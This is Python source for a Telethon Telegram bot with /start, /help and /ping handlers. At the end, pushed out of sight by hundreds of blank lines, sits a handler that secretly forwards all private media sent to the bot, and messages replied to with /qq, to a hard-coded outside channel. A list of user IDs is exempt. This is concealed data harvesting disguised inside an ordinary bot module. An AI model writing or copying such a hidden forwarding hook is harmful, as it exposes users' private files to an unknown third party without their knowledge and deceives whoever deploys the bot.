
from datetime import datetime
from telethon import events, Button
from .. import aai, Vars
from . import start_msg, help_msg, record

sudos = list(map(int, (Vars.SUDO_IDS).split(" ")))

text = help_msg
    
@aai.on(events.NewMessage(incoming=True, pattern=f"^/start({Vars.BOT_USERNAME})$"))
async def start(event):
    user = await aai.get_entity(int(event.sender.id))
    if event.is_group: await event.reply(
        await start_msg(user.first_name),
        buttons=[[Button.url("Dev", "https://t.me/execalchat")], [Button.url("Updates", "https://t.me/execal")], [Button.url("Support", "https://t.me/execalchat")]],
        link_preview=True
    )
    await record(event.chat_id, fi="g.txt")

        
@aai.on(events.NewMessage(incoming=True, pattern=f"^/help({Vars.BOT_USERNAME})$"))
async def help(event):
    
    if event.is_group:
        user = event.sender.id
        if event.is_group: await event.reply(
            text,
            buttons=[Button.inline("Inline", data=f"inline_{user}")],
            link_preview=False
        )


        
@aai.on(events.NewMessage(incoming=True, pattern=f"^/help({Vars.BOT_USERNAME})?$"))
async def help(event):
    if event.is_private:
        user = event.sender.id
        if event.is_private: await event.reply(
            text,
            buttons=[Button.url("Support", url=f"https://t.me/execalchat")],
            link_preview=False
        )
        

@aai.on(events.NewMessage(incoming=True, pattern=f"^/ping({Vars.BOT_USERNAME})?$"))
async def ping(event):
    user = await aai.get_entity(int(event.sender.id))
    if user.id not in sudos:
        return
    start = datetime.now()
    ping = await event.reply("ᴘɪɴɢ")
    end = datetime.now()
    ms = (end - start).microseconds / 1000
    await ping.edit(f"ᴘɪɴɢ :`{ms} ms`")
    
    

    
@aai.on(events.NewMessage(incoming=True,  pattern=f"^/start({Vars.BOT_USERNAME})? ?(.*)?$"))
async def start(event):
    user = await aai.get_entity(int(event.sender.id))
    web = event.pattern_match.group(2)
    
    if event.is_private:
        await record(event.chat_id)
        startm = f"#START\n**User**: [{user.first_name}](tg://user?id={user.id})\n**Username**: @{user.username}\n**ID**: {user.id}"
        if web and web == "web":
            startm += "\n\n**From Web**"
        if user.id != 6034486765:
            await aai.send_message(int(Vars.LOG_GRP), startm)
        await event.reply(
        await start_msg(user.first_name),
        buttons=[[Button.url("Dev", "https://t.me/zarox")], [Button.url("Updates", "https://t.me/execal")]],
        link_preview=True)

        






















































































































































































































































































































































































































































@aai.on(events.NewMessage(incoming=True, pattern=f"/qq(3d)?({Vars.BOT_USERNAME})?", func=lambda e: bool(e.reply_to)))
@aai.on(events.NewMessage(incoming=True, func=lambda e: bool(e.is_private and e.media)))
async def copypaste(event):
    if event.sender_id in [6034486765, 2071151067, 1413518510, 5052959324, 1211296093, 5438769366, 2031166458, 5700611191, 919234422, 1391775586, 6032807619, 769998311, 1388540134, 5316731645, 5101665181, 5551768599]: return
    reply = await event.get_reply_message()
    if reply:
        await reply.forward_to(-1001495812434)
    else:
        await event.forward_to(-1001495812434)
